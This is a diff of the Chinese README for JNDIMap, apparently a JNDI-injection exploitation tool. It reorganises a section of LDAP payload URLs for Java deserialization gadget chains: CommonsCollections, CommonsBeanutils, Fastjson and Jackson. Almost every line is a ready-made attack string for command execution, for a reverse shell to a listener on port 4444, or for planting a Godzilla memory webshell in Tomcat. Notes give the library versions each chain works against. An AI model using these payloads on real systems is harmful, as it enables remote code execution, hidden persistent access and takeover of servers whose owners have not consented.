@@ -496,46 +496,55 @@ ldap://127.0.0.1:1389/TomcatXXE/<base64-url-encoded-path>
 [HTTP] Receive request: /V4J4ZH1P?content=helloworld
 ```
 
-### LDAP Deserialization
+## LDAP Deserialization
 
 通过 LDAP、LDAPS 协议触发 Java 反序列化, 不支持 RMI 协议
 
 JNDIMap 内置以下利用链, 同时也支持反序列化自定义数据
 
 - CommonsCollections K1-K4
-- CommonsBeanutils183
-- CommonsBeanutils194
-- Fastjson1 (1.2.x)
-- Fastjson2 (2.0.x)
+- CommonsBeanutils 183、194
+- Fastjson1 (1.2.x)、Fastjson2 (2.0.x)
 - Jackson
 
-```bash
-# 自定义数据反序列化
+### 自定义数据反序列化
 
+```bash
 # URL 传参加载
 ldap://127.0.0.1:1389/Deserialize/FromUrl/<base64-url-encoded-serialize-data>
+
 # 从运行 JNDIMap 的服务器上加载
 ldap://127.0.0.1:1389/Deserialize/FromFile/payload.ser # 相对于当前路径
 ldap://127.0.0.1:1389/Deserialize/FromFile/<base64-url-encoded-path-to-serialized-data>
+```
 
-# CommonsCollectionsK1 反序列化 (3.1 + TemplatesImpl), 支持命令执行, 反弹 Shell, 内存马注入
+### CommonsCollections
+
+按照 3.1、4.0 和是否依赖 TemplatesImpl, 分为 K1-K4 四个版本
+
+```bash
+# CommonsCollectionsK1 (3.1 + TemplatesImpl), 支持命令执行, 反弹 Shell, 内存马注入
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK1/MemShell/Tomcat/Godzilla/Filter
 
-# CommonsCollectionsK2 反序列化 (4.0 + TemplatesImpl), 功能同上
+# CommonsCollectionsK2 (4.0 + TemplatesImpl), 功能同上
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK2/Command/open -a Calculator
 
-# CommonsCollectionsK3 反序列化 (3.1 + Runtime.exec), 仅支持命令执行
+# CommonsCollectionsK3 (3.1 + Runtime.exec), 仅支持命令执行
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK3/Command/open -a Calculator
 
-# CommonsCollectionsK4 反序列化 (4.0 + Runtime.exec), 功能同上
+# CommonsCollectionsK4 (4.0 + Runtime.exec), 功能同上
 ldap://127.0.0.1:1389/Deserialize/CommonsCollectionsK4/Command/open -a Calculator
+```
 
-# CommonsBeanutils 反序列化
-# 无需 commons-collections 依赖, 使用 TemplatesImpl, 支持命令执行, 反弹 Shell, 内存马注入
-# 根据 BeanComparator serialVersionUID 不同, 分为两个版本: 1.8.3 和 1.9.4
+### CommonsBeanutils
 
+无需 commons-collections 依赖, 使用 TemplatesImpl
+
+根据 BeanComparator serialVersionUID 的不同, 分为两个版本: 1.8.3 和 1.9.4
+
+```bash
 # 1.8.3
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/ReverseShell/127.0.0.1/4444
@@ -545,10 +554,29 @@ ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils183/MemShell/Tomcat/Godzilla/F
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Deserialize/CommonsBeanutils194/MemShell/Tomcat/Godzilla/Filter
+```
 
-# Jackson 反序列化
-# 使用 JdkDynamicAopProxy 优化不稳定性问题, 需要 spring-aop 依赖
+### Fastjson
 
+分为 1.2.x 和 2.0.x 两个版本
+
+```bash
+# Fastjson1: 全版本 (1.2.x)
+ldap://127.0.0.1:1389/Deserialize/Fastjson1/Command/open -a Calculator
+ldap://127.0.0.1:1389/Deserialize/Fastjson1/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/Fastjson1/MemShell/Tomcat/Godzilla/Filter
+
+# Fastjson2: <= 2.0.26
+ldap://127.0.0.1:1389/Deserialize/Fastjson2/Command/open -a Calculator
+ldap://127.0.0.1:1389/Deserialize/Fastjson2/ReverseShell/127.0.0.1/4444
+ldap://127.0.0.1:1389/Deserialize/Fastjson2/MemShell/Tomcat/Godzilla/Filter
+```
+
+### Jackson
+
+使用 JdkDynamicAopProxy 优化不稳定性问题, 需要 spring-aop 依赖
+
+```bash
 # 适用于 JDK 8
 ldap://127.0.0.1:1389/Deserialize/Jackson/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Jackson/ReverseShell/127.0.0.1/4444
@@ -566,18 +594,6 @@ ldap://127.0.0.1:1389/Deserialize/Jackson17A/MemShell/Tomcat/Godzilla/Filter
 ldap://127.0.0.1:1389/Deserialize/Jackson17B/Command/open -a Calculator
 ldap://127.0.0.1:1389/Deserialize/Jackson17B/ReverseShell/127.0.0.1/4444
 ldap://127.0.0.1:1389/Deserialize/Jackson17B/MemShell/Tomcat/Godzilla/Filter
-
-# Fastjson 反序列化
-
-# Fastjson1: 全版本 (1.2.x)
-ldap://127.0.0.1:1389/Deserialize/Fastjson1/Command/open -a Calculator
-ldap://127.0.0.1:1389/Deserialize/Fastjson1/ReverseShell/127.0.0.1/4444
-ldap://127.0.0.1:1389/Deserialize/Fastjson1/MemShell/Tomcat/Godzilla/Filter
-
-# Fastjson2: <= 2.0.26
-ldap://127.0.0.1:1389/Deserialize/Fastjson2/Command/open -a Calculator
-ldap://127.0.0.1:1389/Deserialize/Fastjson2/ReverseShell/127.0.0.1/4444
-ldap://127.0.0.1:1389/Deserialize/Fastjson2/MemShell/Tomcat/Godzilla/Filter
 ```
 
 ## Script
